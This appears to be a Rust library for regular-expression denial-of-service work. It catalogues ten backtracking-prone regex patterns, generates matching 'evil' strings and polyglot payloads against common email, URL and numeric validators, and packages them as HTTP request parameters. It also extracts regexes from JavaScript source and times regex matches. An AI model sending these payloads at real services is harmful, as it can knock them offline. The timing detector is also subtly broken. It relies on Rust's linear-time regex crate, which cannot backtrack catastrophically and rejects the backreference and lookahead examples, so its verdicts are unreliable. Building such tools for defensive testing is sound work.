use std::fmt;
use std::time::{Duration, Instant};

/// Categories of regex patterns vulnerable to catastrophic backtracking.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum RedosVulnPattern {
    NestedQuantifiers,
    OverlappingAlternation,
    UnboundedRepetitionAmbiguous,
    BackreferenceWithQuantifier,
    LazyInsideGreedy,
    StarHeight,
    OverlappingCharacterClasses,
    RecursiveGroupRepetition,
    LookaheadWithBacktracking,
    AnchoredAlternationBomb,
}

impl RedosVulnPattern {
    pub fn all() -> &'static [RedosVulnPattern] {
        &[
            Self::NestedQuantifiers,
            Self::OverlappingAlternation,
            Self::UnboundedRepetitionAmbiguous,
            Self::BackreferenceWithQuantifier,
            Self::LazyInsideGreedy,
            Self::StarHeight,
            Self::OverlappingCharacterClasses,
            Self::RecursiveGroupRepetition,
            Self::LookaheadWithBacktracking,
            Self::AnchoredAlternationBomb,
        ]
    }

    pub fn severity(self) -> f64 {
        match self {
            Self::NestedQuantifiers => 8.0,
            Self::OverlappingAlternation => 7.5,
            Self::UnboundedRepetitionAmbiguous => 7.0,
            Self::BackreferenceWithQuantifier => 8.5,
            Self::LazyInsideGreedy => 6.5,
            Self::StarHeight => 9.0,
            Self::OverlappingCharacterClasses => 7.0,
            Self::RecursiveGroupRepetition => 8.5,
            Self::LookaheadWithBacktracking => 7.5,
            Self::AnchoredAlternationBomb => 8.0,
        }
    }

    pub fn example_regex(self) -> &'static str {
        match self {
            Self::NestedQuantifiers => r"(a+)+$",
            Self::OverlappingAlternation => r"(a|a)+$",
            Self::UnboundedRepetitionAmbiguous => r"(.*a){10}",
            Self::BackreferenceWithQuantifier => r"(a+)\1+$",
            Self::LazyInsideGreedy => r"(a+?)*$",
            Self::StarHeight => r"(a*)*$",
            Self::OverlappingCharacterClasses => r"([a-zA-Z]+)*$",
            Self::RecursiveGroupRepetition => r"((a+b)+c)+$",
            Self::LookaheadWithBacktracking => r"(?=a+b)a+$",
            Self::AnchoredAlternationBomb => r"^(a+|b+|ab)+$",
        }
    }

    pub fn description(self) -> &'static str {
        match self {
            Self::NestedQuantifiers => {
                "Nested quantifiers like (a+)+ cause exponential backtracking"
            }
            Self::OverlappingAlternation => "Overlapping alternation (a|a) duplicates match paths",
            Self::UnboundedRepetitionAmbiguous => {
                "Unbounded .* with repeated group creates polynomial blowup"
            }
            Self::BackreferenceWithQuantifier => {
                "Backreference combined with quantifier forces re-evaluation"
            }
            Self::LazyInsideGreedy => {
                "Lazy quantifier nested inside greedy creates oscillating backtrack"
            }
            Self::StarHeight => "Star-height > 1 (a*)* triggers exponential state explosion",
            Self::OverlappingCharacterClasses => {
                "Overlapping character classes in repeated group multiply paths"
            }
            Self::RecursiveGroupRepetition => {
                "Nested groups with quantifiers at each level compound backtracking"
            }
            Self::LookaheadWithBacktracking => {
                "Lookahead forces engine to re-traverse already matched input"
            }
            Self::AnchoredAlternationBomb => {
                "Anchored alternation with overlapping options explodes on failure"
            }
        }
    }
}

impl fmt::Display for RedosVulnPattern {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::NestedQuantifiers => "nested-quantifiers",
            Self::OverlappingAlternation => "overlapping-alternation",
            Self::UnboundedRepetitionAmbiguous => "unbounded-repetition-ambiguous",
            Self::BackreferenceWithQuantifier => "backreference-with-quantifier",
            Self::LazyInsideGreedy => "lazy-inside-greedy",
            Self::StarHeight => "star-height",
            Self::OverlappingCharacterClasses => "overlapping-character-classes",
            Self::RecursiveGroupRepetition => "recursive-group-repetition",
            Self::LookaheadWithBacktracking => "lookahead-with-backtracking",
            Self::AnchoredAlternationBomb => "anchored-alternation-bomb",
        };
        write!(f, "{label}")
    }
}

/// A generated evil string designed to trigger catastrophic backtracking.
#[derive(Debug, Clone, PartialEq)]
pub struct RedosPayload {
    pub pattern: RedosVulnPattern,
    pub evil_string: String,
    pub target_regex: String,
    pub expected_complexity: BacktrackComplexity,
    pub description: String,
}

/// Estimated backtracking complexity class.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum BacktrackComplexity {
    Exponential,
    Polynomial,
    SuperLinear,
}

impl fmt::Display for BacktrackComplexity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Exponential => "O(2^n)",
            Self::Polynomial => "O(n^k)",
            Self::SuperLinear => "O(n log n)",
        };
        write!(f, "{label}")
    }
}

/// Result from analyzing a regex pattern for ReDoS vulnerability.
#[derive(Debug, Clone, PartialEq)]
pub struct RegexAnalysis {
    pub input_regex: String,
    pub vulnerable: bool,
    pub matched_patterns: Vec<RedosVulnPattern>,
    pub estimated_severity: f64,
    pub evil_strings: Vec<String>,
}

/// Result from timing-based ReDoS detection.
#[derive(Debug, Clone)]
pub struct TimingResult {
    pub input_lengths: Vec<usize>,
    pub durations_us: Vec<u128>,
    pub growth_ratio: f64,
    pub likely_vulnerable: bool,
    pub complexity_estimate: BacktrackComplexity,
}

/// Polyglot ReDoS payload that triggers multiple regex engines.
#[derive(Debug, Clone, PartialEq)]
pub struct PolyglotPayload {
    pub evil_string: String,
    pub target_engines: Vec<RegexEngine>,
    pub trigger_patterns: Vec<String>,
    pub description: String,
}

/// Regex engine targets for polyglot payloads.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum RegexEngine {
    Pcre,
    JavaScript,
    Python,
    Java,
    DotNet,
    Ruby,
}

impl fmt::Display for RegexEngine {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Pcre => "PCRE",
            Self::JavaScript => "JavaScript",
            Self::Python => "Python",
            Self::Java => "Java",
            Self::DotNet => ".NET",
            Self::Ruby => "Ruby",
        };
        write!(f, "{label}")
    }
}

/// Core ReDoS engine: analysis, payload generation, timing detection.
pub struct RedosEngine {
    max_payload_length: usize,
    timing_iterations: usize,
    growth_threshold: f64,
}

impl Default for RedosEngine {
    fn default() -> Self {
        Self {
            max_payload_length: 50,
            timing_iterations: 6,
            growth_threshold: 2.0,
        }
    }
}

impl RedosEngine {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn with_max_payload_length(mut self, len: usize) -> Self {
        self.max_payload_length = len;
        self
    }

    pub fn with_timing_iterations(mut self, n: usize) -> Self {
        self.timing_iterations = n;
        self
    }

    pub fn with_growth_threshold(mut self, threshold: f64) -> Self {
        self.growth_threshold = threshold;
        self
    }

    /// Analyze a regex string for known vulnerable patterns.
    pub fn analyze_regex(&self, regex_str: &str) -> RegexAnalysis {
        let mut matched = Vec::new();

        if has_nested_quantifiers(regex_str) {
            matched.push(RedosVulnPattern::NestedQuantifiers);
        }
        if has_overlapping_alternation(regex_str) {
            matched.push(RedosVulnPattern::OverlappingAlternation);
        }
        if has_unbounded_repetition_ambiguous(regex_str) {
            matched.push(RedosVulnPattern::UnboundedRepetitionAmbiguous);
        }
        if has_backreference_quantifier(regex_str) {
            matched.push(RedosVulnPattern::BackreferenceWithQuantifier);
        }
        if has_lazy_inside_greedy(regex_str) {
            matched.push(RedosVulnPattern::LazyInsideGreedy);
        }
        if has_star_height(regex_str) {
            matched.push(RedosVulnPattern::StarHeight);
        }
        if has_overlapping_char_classes(regex_str) {
            matched.push(RedosVulnPattern::OverlappingCharacterClasses);
        }
        if has_recursive_group_repetition(regex_str) {
            matched.push(RedosVulnPattern::RecursiveGroupRepetition);
        }
        if has_lookahead_backtracking(regex_str) {
            matched.push(RedosVulnPattern::LookaheadWithBacktracking);
        }
        if has_anchored_alternation_bomb(regex_str) {
            matched.push(RedosVulnPattern::AnchoredAlternationBomb);
        }

        let severity = if matched.is_empty() {
            0.0
        } else {
            matched.iter().map(|p| p.severity()).fold(0.0_f64, f64::max)
        };

        let evil_strings: Vec<String> = matched
            .iter()
            .map(|p| generate_evil_string(*p, self.max_payload_length))
            .collect();

        RegexAnalysis {
            input_regex: regex_str.to_string(),
            vulnerable: !matched.is_empty(),
            matched_patterns: matched,
            estimated_severity: severity,
            evil_strings,
        }
    }

    /// Generate all payload patterns (>= 10 distinct categories).
    pub fn generate_payloads(&self) -> Vec<RedosPayload> {
        RedosVulnPattern::all()
            .iter()
            .map(|pattern| {
                let evil = generate_evil_string(*pattern, self.max_payload_length);
                RedosPayload {
                    pattern: *pattern,
                    evil_string: evil,
                    target_regex: pattern.example_regex().to_string(),
                    expected_complexity: pattern_complexity(*pattern),
                    description: pattern.description().to_string(),
                }
            })
            .collect()
    }

    /// Generate an evil string for a specific vulnerable pattern.
    pub fn generate_evil_for_pattern(&self, pattern: RedosVulnPattern) -> RedosPayload {
        let evil = generate_evil_string(pattern, self.max_payload_length);
        RedosPayload {
            pattern,
            evil_string: evil,
            target_regex: pattern.example_regex().to_string(),
            expected_complexity: pattern_complexity(pattern),
            description: pattern.description().to_string(),
        }
    }

    /// Timing-based ReDoS detection: run a regex against strings of
    /// increasing length and measure response time growth rate.
    pub fn detect_via_timing(&self, regex_str: &str) -> Option<TimingResult> {
        let re = regex::Regex::new(regex_str).ok()?;
        let base_char = infer_pump_char(regex_str);
        let suffix = infer_failing_suffix(regex_str);

        let mut lengths = Vec::with_capacity(self.timing_iterations);
        let mut durations = Vec::with_capacity(self.timing_iterations);

        for i in 0..self.timing_iterations {
            let len = 5 + i * 5;
            let input = format!("{}{}", base_char.to_string().repeat(len), suffix);

            let start = Instant::now();
            let _ = re.is_match(&input);
            let elapsed = start.elapsed();

            lengths.push(len);
            durations.push(elapsed.as_micros());
        }

        let growth = compute_growth_ratio(&durations);
        let vulnerable = growth > self.growth_threshold;

        let complexity = if growth > 10.0 {
            BacktrackComplexity::Exponential
        } else if growth > 3.0 {
            BacktrackComplexity::Polynomial
        } else {
            BacktrackComplexity::SuperLinear
        };

        Some(TimingResult {
            input_lengths: lengths,
            durations_us: durations,
            growth_ratio: growth,
            likely_vulnerable: vulnerable,
            complexity_estimate: complexity,
        })
    }

    /// Generate polyglot ReDoS strings that affect multiple regex engines.
    pub fn generate_polyglot_payloads(&self) -> Vec<PolyglotPayload> {
        vec![
            PolyglotPayload {
                evil_string: "a".repeat(self.max_payload_length) + "!",
                target_engines: vec![
                    RegexEngine::Pcre,
                    RegexEngine::JavaScript,
                    RegexEngine::Python,
                    RegexEngine::Java,
                    RegexEngine::Ruby,
                ],
                trigger_patterns: vec![r"(a+)+$".to_string(), r"(a+)+\z".to_string()],
                description:
                    "Classic nested quantifier bomb — universal across backtracking engines"
                        .to_string(),
            },
            PolyglotPayload {
                evil_string: "a".repeat(self.max_payload_length) + "b",
                target_engines: vec![
                    RegexEngine::Pcre,
                    RegexEngine::JavaScript,
                    RegexEngine::Python,
                    RegexEngine::DotNet,
                ],
                trigger_patterns: vec![r"(a|aa)+$".to_string(), r"(a|aa)+\z".to_string()],
                description: "Overlapping alternation bomb — ambiguous branch duplication"
                    .to_string(),
            },
            PolyglotPayload {
                evil_string: "a".repeat(self.max_payload_length) + "\n",
                target_engines: vec![
                    RegexEngine::JavaScript,
                    RegexEngine::Python,
                    RegexEngine::Ruby,
                ],
                trigger_patterns: vec![r"(a*)*$".to_string(), r"([a-z]+)*$".to_string()],
                description: "Star-height bomb — zero-width matches in nested quantifiers"
                    .to_string(),
            },
            PolyglotPayload {
                evil_string: build_email_bomb(self.max_payload_length),
                target_engines: vec![
                    RegexEngine::Pcre,
                    RegexEngine::JavaScript,
                    RegexEngine::Python,
                    RegexEngine::Java,
                    RegexEngine::DotNet,
                    RegexEngine::Ruby,
                ],
                trigger_patterns: vec![
                    r"^([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})+$".to_string(),
                ],
                description: "Email validation bomb — nested repetition in common email regex"
                    .to_string(),
            },
            PolyglotPayload {
                evil_string: build_url_bomb(self.max_payload_length),
                target_engines: vec![
                    RegexEngine::Pcre,
                    RegexEngine::JavaScript,
                    RegexEngine::Python,
                    RegexEngine::Java,
                ],
                trigger_patterns: vec![
                    r"^(https?://)?([a-zA-Z0-9.-]+)+(/[a-zA-Z0-9._~:/?#\[\]@!$&'()*+,;=-]*)$"
                        .to_string(),
                ],
                description: "URL validation bomb — repeated hostname character classes"
                    .to_string(),
            },
            PolyglotPayload {
                evil_string: "0".repeat(self.max_payload_length) + "x",
                target_engines: vec![
                    RegexEngine::JavaScript,
                    RegexEngine::Python,
                    RegexEngine::Java,
                    RegexEngine::Ruby,
                ],
                trigger_patterns: vec![r"^(\d+\.?\d*|\.\d+)([eE]\d+)?$".to_string()],
                description: "Numeric validation bomb — ambiguous decimal dot handling".to_string(),
            },
        ]
    }

    /// Extract regex patterns from error messages or JavaScript source.
    pub fn extract_regex_from_source(&self, source: &str) -> Vec<String> {
        let mut regexes = Vec::new();
        let slash_re = regex::Regex::new(r"/([^/\n]{3,})/[gimsuy]*").unwrap();
        for cap in slash_re.captures_iter(source) {
            if let Some(m) = cap.get(1) {
                let pattern = m.as_str();
                if looks_like_regex(pattern) {
                    regexes.push(pattern.to_string());
                }
            }
        }

        let constructor_re =
            regex::Regex::new(r#"(?:new\s+RegExp|re\.compile)\s*\(\s*['"]([^'"]+)['"]"#).unwrap();
        for cap in constructor_re.captures_iter(source) {
            if let Some(m) = cap.get(1) {
                regexes.push(m.as_str().to_string());
            }
        }

        let error_re =
            regex::Regex::new(r#"(?:pattern|regex|regexp|validation)\s*[:=]\s*['"/]([^'"]+)['"/]"#)
                .unwrap();
        for cap in error_re.captures_iter(source) {
            if let Some(m) = cap.get(1) {
                let candidate = m.as_str();
                if candidate.len() >= 3 {
                    regexes.push(candidate.to_string());
                }
            }
        }

        regexes.sort();
        regexes.dedup();
        regexes
    }

    /// Build HTTP payloads suitable for injecting into request parameters.
    pub fn build_http_payloads(&self) -> Vec<(String, String)> {
        let payloads = self.generate_payloads();
        payloads
            .into_iter()
            .map(|p| {
                let param_value = p.evil_string.clone();
                let header_desc = format!("ReDoS-{}", p.pattern);
                (param_value, header_desc)
            })
            .collect()
    }

    /// Generate evil strings at escalating lengths for timing probes.
    pub fn generate_escalating_payloads(
        &self,
        pattern: RedosVulnPattern,
        steps: usize,
    ) -> Vec<(usize, String)> {
        (0..steps)
            .map(|i| {
                let len = 5 + i * 5;
                let evil = generate_evil_string(pattern, len);
                (len, evil)
            })
            .collect()
    }
}

fn generate_evil_string(pattern: RedosVulnPattern, length: usize) -> String {
    let pump = "a".repeat(length);
    match pattern {
        RedosVulnPattern::NestedQuantifiers => format!("{pump}!"),
        RedosVulnPattern::OverlappingAlternation => format!("{pump}!"),
        RedosVulnPattern::UnboundedRepetitionAmbiguous => format!("{pump}b"),
        RedosVulnPattern::BackreferenceWithQuantifier => format!("{pump}!"),
        RedosVulnPattern::LazyInsideGreedy => format!("{pump}!"),
        RedosVulnPattern::StarHeight => format!("{pump}\x01"),
        RedosVulnPattern::OverlappingCharacterClasses => format!("{pump}9"),
        RedosVulnPattern::RecursiveGroupRepetition => {
            let unit = "ab".repeat(length / 2);
            format!("{unit}!")
        }
        RedosVulnPattern::LookaheadWithBacktracking => format!("{pump}!"),
        RedosVulnPattern::AnchoredAlternationBomb => {
            let mixed: String = (0..length)
                .map(|i| if i % 2 == 0 { 'a' } else { 'b' })
                .collect();
            format!("{mixed}!")
        }
    }
}

fn pattern_complexity(pattern: RedosVulnPattern) -> BacktrackComplexity {
    match pattern {
        RedosVulnPattern::NestedQuantifiers => BacktrackComplexity::Exponential,
        RedosVulnPattern::OverlappingAlternation => BacktrackComplexity::Exponential,
        RedosVulnPattern::UnboundedRepetitionAmbiguous => BacktrackComplexity::Polynomial,
        RedosVulnPattern::BackreferenceWithQuantifier => BacktrackComplexity::Exponential,
        RedosVulnPattern::LazyInsideGreedy => BacktrackComplexity::Exponential,
        RedosVulnPattern::StarHeight => BacktrackComplexity::Exponential,
        RedosVulnPattern::OverlappingCharacterClasses => BacktrackComplexity::Exponential,
        RedosVulnPattern::RecursiveGroupRepetition => BacktrackComplexity::Exponential,
        RedosVulnPattern::LookaheadWithBacktracking => BacktrackComplexity::Polynomial,
        RedosVulnPattern::AnchoredAlternationBomb => BacktrackComplexity::Exponential,
    }
}

fn has_nested_quantifiers(s: &str) -> bool {
    let re = regex::Regex::new(r"\([^)]*[+*][^)]*\)[+*]").unwrap();
    re.is_match(s)
}

fn has_overlapping_alternation(s: &str) -> bool {
    let inner_re = regex::Regex::new(r"\(([^)]+)\)[+*]").unwrap();
    for cap in inner_re.captures_iter(s) {
        let inside = &cap[1];
        if !inside.contains('|') {
            continue;
        }
        let alts: Vec<&str> = inside.split('|').collect();
        for i in 0..alts.len() {
            for j in (i + 1)..alts.len() {
                if alts[i] == alts[j] || chars_overlap(alts[i], alts[j]) {
                    return true;
                }
            }
        }
    }
    false
}

fn chars_overlap(a: &str, b: &str) -> bool {
    let a_chars: std::collections::HashSet<char> = expand_simple(a).into_iter().collect();
    let b_chars: std::collections::HashSet<char> = expand_simple(b).into_iter().collect();
    a_chars.intersection(&b_chars).next().is_some()
}

fn expand_simple(s: &str) -> Vec<char> {
    let mut chars = Vec::new();
    for c in s.chars() {
        match c {
            '.' => {
                for ch in 'a'..='z' {
                    chars.push(ch);
                }
            }
            '+' | '*' | '?' | '\\' | '^' | '$' | '(' | ')' | '[' | ']' => {}
            _ => chars.push(c),
        }
    }
    if chars.is_empty() {
        for ch in 'a'..='z' {
            chars.push(ch);
        }
    }
    chars
}

fn has_unbounded_repetition_ambiguous(s: &str) -> bool {
    let re = regex::Regex::new(r"\(\.\*[^)]*\)\{").unwrap();
    if re.is_match(s) {
        return true;
    }
    let re2 = regex::Regex::new(r"\.\*.*[+*]").unwrap();
    re2.is_match(s) && s.contains('(')
}

fn has_backreference_quantifier(s: &str) -> bool {
    let re = regex::Regex::new(r"\\[1-9]\d*[+*]").unwrap();
    re.is_match(s)
}

fn has_lazy_inside_greedy(s: &str) -> bool {
    let re = regex::Regex::new(r"\([^)]*[+*]\?[^)]*\)[+*]").unwrap();
    re.is_match(s)
}

fn has_star_height(s: &str) -> bool {
    let re = regex::Regex::new(r"\([^)]*\*[^)]*\)\*").unwrap();
    re.is_match(s)
}

fn has_overlapping_char_classes(s: &str) -> bool {
    let re = regex::Regex::new(r"\(\[.*\][+*]\)\*").unwrap();
    if re.is_match(s) {
        return true;
    }
    let re2 = regex::Regex::new(r"\(\[[a-zA-Z]-[a-zA-Z]\][+*]\)[+*]").unwrap();
    re2.is_match(s)
}

fn has_recursive_group_repetition(s: &str) -> bool {
    let re = regex::Regex::new(r"\(\([^)]*\)[+*][^)]*\)[+*]").unwrap();
    re.is_match(s)
}

fn has_lookahead_backtracking(s: &str) -> bool {
    let re = regex::Regex::new(r"\(\?[=!][^)]*[+*][^)]*\)").unwrap();
    re.is_match(s) && s.contains('+')
}

fn has_anchored_alternation_bomb(s: &str) -> bool {
    if !s.starts_with('^') {
        return false;
    }
    let re = regex::Regex::new(r"\([^)]*\|[^)]*\)[+*]").unwrap();
    if re.is_match(s) {
        let inner = regex::Regex::new(r"\(([^)]+)\)").unwrap();
        if let Some(cap) = inner.captures(s) {
            let alts: Vec<&str> = cap[1].split('|').collect();
            if alts.len() >= 2 {
                return alts.iter().any(|a| a.contains('+') || a.contains('*'));
            }
        }
    }
    false
}

fn infer_pump_char(regex_str: &str) -> char {
    let char_re = regex::Regex::new(r"\[([a-z])-").unwrap();
    if let Some(cap) = char_re.captures(regex_str) {
        return cap[1].chars().next().unwrap_or('a');
    }
    if regex_str.contains(r"\d") {
        return '0';
    }
    for c in regex_str.chars() {
        if c.is_ascii_alphabetic() {
            return c;
        }
    }
    'a'
}

fn infer_failing_suffix(regex_str: &str) -> &'static str {
    if regex_str.ends_with('$') || regex_str.ends_with(r"\z") {
        "!"
    } else {
        "\x01"
    }
}

fn compute_growth_ratio(durations: &[u128]) -> f64 {
    if durations.len() < 2 {
        return 1.0;
    }
    let mut ratios = Vec::new();
    for window in durations.windows(2) {
        let prev = window[0].max(1) as f64;
        let curr = window[1].max(1) as f64;
        ratios.push(curr / prev);
    }
    if ratios.is_empty() {
        return 1.0;
    }
    let mut sorted = ratios.clone();
    sorted.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
    sorted[sorted.len() / 2]
}

fn looks_like_regex(s: &str) -> bool {
    let meta_chars = [
        '+', '*', '?', '(', ')', '[', ']', '{', '}', '|', '\\', '^', '$', '.',
    ];
    let meta_count = s.chars().filter(|c| meta_chars.contains(c)).count();
    meta_count >= 2
}

fn build_email_bomb(length: usize) -> String {
    let local = "a".repeat(length);
    format!("{local}@")
}

fn build_url_bomb(length: usize) -> String {
    let host = "a.".repeat(length / 2);
    format!("http://{host}!")
}

/// Convenience function: analyze a regex and return evil strings if vulnerable.
pub fn quick_redos_check(regex_str: &str) -> Option<Vec<String>> {
    let engine = RedosEngine::new();
    let analysis = engine.analyze_regex(regex_str);
    if analysis.vulnerable {
        Some(analysis.evil_strings)
    } else {
        None
    }
}

/// Convenience function: get all payload patterns.
pub fn all_redos_payloads() -> Vec<RedosPayload> {
    RedosEngine::new().generate_payloads()
}

/// Measure wall-clock time of a regex match. Returns None if regex is invalid.
pub fn measure_regex_time(regex_str: &str, input: &str) -> Option<Duration> {
    let re = regex::Regex::new(regex_str).ok()?;
    let start = Instant::now();
    let _ = re.is_match(input);
    Some(start.elapsed())
}
